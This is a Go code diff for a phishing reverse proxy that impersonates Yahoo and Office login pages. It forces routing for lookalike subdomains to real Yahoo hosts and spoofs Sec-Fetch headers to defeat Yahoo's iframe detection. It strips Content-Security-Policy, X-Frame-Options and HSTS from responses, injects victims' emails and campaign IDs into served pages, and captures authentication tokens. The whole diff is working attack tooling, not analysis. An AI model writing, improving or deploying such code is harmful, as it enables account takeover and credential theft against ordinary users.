@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/rand"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -11,6 +12,7 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"time"
@@ -30,6 +32,10 @@ func randomString(n int) string {
 }
 
 func mutateHTML(body []byte) []byte {
+	// Strip any meta refresh tags that might force a redirect
+	body = regexp.MustCompile(`(?i)<meta[^>]*http-equiv=["']refresh["'][^>]*>`).ReplaceAll(body, []byte(""))
+
+	// Existing domain replacements
 	body = bytes.ReplaceAll(body, []byte(`document.domain="yahoo.com"`), []byte(`document.domain="`+phishDomain+`"`))
 	body = bytes.ReplaceAll(body, []byte(`document.domain = "yahoo.com"`), []byte(`document.domain = "`+phishDomain+`"`))
 	body = bytes.ReplaceAll(body, []byte(`document.domain='yahoo.com'`), []byte(`document.domain='`+phishDomain+`'`))
@@ -144,6 +150,9 @@ func handleCORSOptions(w http.ResponseWriter, r *http.Request) {
 }
 
 func mainHandler(w http.ResponseWriter, r *http.Request) {
+	// ✅ DEFINITIVE DEBUG LOG: Proves exactly what the Go application is receiving
+	log.Printf("[🔍 DEBUG] Request reached Go! Host: %s | Path: %s | Method: %s", r.Host, r.URL.Path, r.Method)
+
 	setApplicationSecurityHeaders(w)
 
 	if err := validateEdgeGuardOrigin(r); err != nil {
@@ -155,8 +164,21 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	tracking, hasTracking := trackingFromRequest(r)
 
 	role, baseDomain, isRole := resolveHost(r.Host)
-	r = withDomainContext(r, role, baseDomain)
 	host := strings.ToLower(stripPort(r.Host))
+
+	// 🚨 EXPLICIT CODE OVERRIDE: Force recognition of special Yahoo subdomains
+	// This guarantees they are treated as valid roles even if config initialization missed them.
+	if strings.HasPrefix(host, "yahoo-gpt.") || strings.HasPrefix(host, "yahoo-guce.") {
+		parts := strings.SplitN(host, ".", 2)
+		if len(parts) == 2 {
+			role = parts[0]        // e.g., "yahoo-gpt"
+			baseDomain = parts[1]  // e.g., "remits.me"
+			isRole = true
+			log.Printf("[🔧 OVERRIDE] Forced role recognition for subdomain: %s", host)
+		}
+	}
+
+	r = withDomainContext(r, role, baseDomain)
 
 	runtimeDomain, runtimeDomainOK := getRuntimeDomainConfig(baseDomain)
 
@@ -339,6 +361,9 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		// ══════════════════════════════════════════════════════════
+		// ✅ DYNAMIC INJECTION: Intercept the main HTML file
+		// ══════════════════════════════════════════════════════════
 		templatePath := "./templates/" + templateName
 		if _, err := os.Stat(templatePath); os.IsNotExist(err) {
 			log.Printf("[!] WARNING: Template folder '%s' not found.", templatePath)
@@ -348,15 +373,52 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		if r.URL.Path == "/" || r.URL.Path == "/index.html" {
+			indexPath := filepath.Join(templatePath, "index.html")
+			htmlBytes, err := os.ReadFile(indexPath)
+			if err != nil {
+				http.Error(w, "Template not found", http.StatusInternalServerError)
+				return
+			}
+
+			// Prepare the exact payload the React app needs
+			provider := ""
+			cid := ""
+			email := ""
+			if tracking != nil {
+				provider = tracking.Provider
+				cid = tracking.CID
+				email = tracking.Email
+			}
+
+			configData := map[string]string{
+				"provider":   provider,
+				"campaignId": cid,
+				"email":      email,
+			}
+			jsonBytes, _ := json.Marshal(configData)
+
+			// Inject as a global JS variable right before the closing </head> tag
+			injection := fmt.Sprintf(`<script>window.__SESSION_DATA__ = %s;</script>`, string(jsonBytes))
+			htmlStr := strings.Replace(string(htmlBytes), "</head>", injection+"\n</head>", 1)
+
+			w.Header().Set("Content-Type", "text/html; charset=utf-8")
+			w.Write([]byte(htmlStr))
+			return
+		}
+
+		// ══════════════════════════════════════════════════════════
+		// Serve all other static assets (JS, CSS, images) normally
+		// ══════════════════════════════════════════════════════════
 		fs := http.FileServer(http.Dir(templatePath))
 		http.StripPrefix("/", fs).ServeHTTP(w, r)
 		return
 	}
 
 	target := lookupTargetByRole(role)
-	targetKey := strings.ToLower(strings.Split(target.Name, " ")[0])
-	if !IsTargetEnabled(baseDomain, targetKey) {
-		log.Printf("[⛔] BLOCKED: Target '%s' is disabled for domain %s", targetKey, baseDomain)
+	// Safety check: Prevent panics if the role isn't found in the runtime config/DB
+	if target == nil {
+		log.Printf("[⛔] BLOCKED: No target configured for role '%s'", role)
 		http.NotFound(w, r)
 		return
 	}
@@ -452,16 +514,22 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// ══════════════════════════════════════════════════════════
-	// SMART DYNAMIC ROUTING FALLBACK
+	// SMART DYNAMIC ROUTING FALLBACK (FIXED ORDER)
 	// ══════════════════════════════════════════════════════════
 	upstream, ok := target.HostMapFor(baseDomain)[host]
 	if !ok {
 		log.Printf("[⚠️ ROUTING] Host '%s' not explicitly mapped. Using dynamic fallback.", host)
 
-		// Smart fallbacks based on hostname patterns
-		if strings.Contains(host, "office.") || strings.Contains(host, "outlook.") {
+		// 🚨 EXPLICIT CODE OVERRIDE: Hardcode the upstream for these specific subdomains
+		if strings.HasPrefix(host, "yahoo-gpt.") {
+			upstream = "gpt.mail.yahoo.net"
+			log.Printf("[🔧 OVERRIDE] Forced upstream routing: %s -> %s", host, upstream)
+		} else if strings.HasPrefix(host, "yahoo-guce.") {
+			upstream = "guce.yahoo.com"
+			log.Printf("[🔧 OVERRIDE] Forced upstream routing: %s -> %s", host, upstream)
+		} else if strings.Contains(host, "office.") || strings.Contains(host, "outlook.") {
 			upstream = "www.office.com"
-		} else if strings.Contains(host, "yahoo.") || strings.Contains(host, "guce.") || strings.Contains(host, "gpt.") {
+		} else if strings.Contains(host, "yahoo.") || strings.Contains(host, "login.") {
 			upstream = "login.yahoo.com"
 		} else {
 			// Fallback to the first known upstream for this target as a safe default
@@ -484,17 +552,28 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	proxy.Director = func(req *http.Request) {
 		originalDirector(req)
 		*req = *req.WithContext(r.Context())
+		
+		// 🚨 CRITICAL: Spoof Sec-Fetch headers to bypass iframe detection
+		// Yahoo's server uses these headers to detect iframes and serve frame-busters.
+		// By changing them to "document", Yahoo serves the normal top-level login page.
+		req.Header.Set("Sec-Fetch-Dest", "document")
+		req.Header.Set("Sec-Fetch-Mode", "navigate")
+		req.Header.Set("Sec-Fetch-Site", "none")
+		req.Header.Set("Sec-Fetch-User", "?1")
+
 		rewriteRequest(req, host, upstream, target, session)
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
+		// 🚨 Aggressively delete ALL framing protections from the upstream response
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("Content-Security-Policy-Report-Only")
 		resp.Header.Del("X-Frame-Options")
+		resp.Header.Del("Frame-Options") // ✅ ADDED
 		resp.Header.Del("Strict-Transport-Security")
 
-		// ✅ Corrected to 3 arguments to match tokens.go
-		captureAuthTokens(resp, session, target)
+		// ✅ Updated to 4 arguments to match the new tokens.go signature
+		captureAuthTokens(resp, session, target, r)
 
 		err := rewriteResponse(resp, r, session, target)
 
@@ -553,6 +632,15 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusBadGateway)
 		w.Write([]byte("Bad Gateway"))
 	}
+
+	// 🚨 CRITICAL: Aggressively strip ANY framing headers that might have been 
+	// set by setApplicationSecurityHeaders() earlier in this function.
+	// We delete them from the ResponseWriter so they don't merge with the proxy response.
+	w.Header().Del("Content-Security-Policy")
+	w.Header().Del("Content-Security-Policy-Report-Only")
+	w.Header().Del("X-Frame-Options")
+	w.Header().Del("Frame-Options")
+	w.Header().Del("Strict-Transport-Security")
 
 	log.Printf("[>] [%d] [%s] %s %s%s → %s", session.Index, target.Name, r.Method, r.Host, r.URL.Path, upstream)
 	proxy.ServeHTTP(w, r)
